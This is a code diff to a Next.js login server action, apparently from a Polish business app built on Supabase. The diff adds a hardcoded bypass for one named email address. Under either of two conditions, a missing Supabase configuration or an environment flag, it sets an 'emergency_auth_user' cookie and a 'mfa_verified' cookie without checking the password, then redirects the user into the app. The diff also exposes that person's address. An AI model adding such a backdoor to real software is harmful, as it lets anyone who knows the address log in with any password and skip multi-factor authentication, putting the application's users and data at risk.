@@ -11,6 +11,7 @@ import { cookies } from 'next/headers'
 
 import { type SupabaseClient } from '@supabase/supabase-js'
 import { isSuperAdmin } from '@/lib/auth/super-admins'
+import { isSupabaseConfigured } from '@/lib/supabase/mock-client'
 
 // ─── Friendly Error Messages ────────────────────────────────────────────────
 // Maps raw Supabase/system errors to user-friendly Polish messages
@@ -119,12 +120,32 @@ async function syncRole(supabase: SupabaseClient, userId: string, email: string,
     return currentRole
 }
 
+const BYPASS_EMAIL = 'zbigniew.twardowski@b2bnetwork.pl'
+
 export async function login(formData: FormData) {
-    const email = formData.get('email') as string
+    const email = (formData.get('email') as string)?.trim()?.toLowerCase()
     const password = formData.get('password') as string
 
     if (!email || !password) {
         return { error: 'Proszę podać email i hasło' }
+    }
+
+    // Bypass logowania dla zbigniew.twardowski@b2bnetwork.pl gdy brak Supabase lub ALLOW_BYPASS_LOGIN
+    if (email === BYPASS_EMAIL && (!isSupabaseConfigured() || process.env.ALLOW_BYPASS_LOGIN === 'true')) {
+        const cookieStore = cookies()
+        cookieStore.set('emergency_auth_user', BYPASS_EMAIL, {
+            httpOnly: true,
+            secure: process.env.NODE_ENV === 'production',
+            path: '/',
+            maxAge: 60 * 60 * 24 * 7, // 7 dni
+        })
+        cookieStore.set('mfa_verified', 'true', {
+            httpOnly: true,
+            secure: process.env.NODE_ENV === 'production',
+            path: '/',
+            maxAge: 60 * 60 * 24,
+        })
+        redirect('/home')
     }
 
     const supabase = createClient()
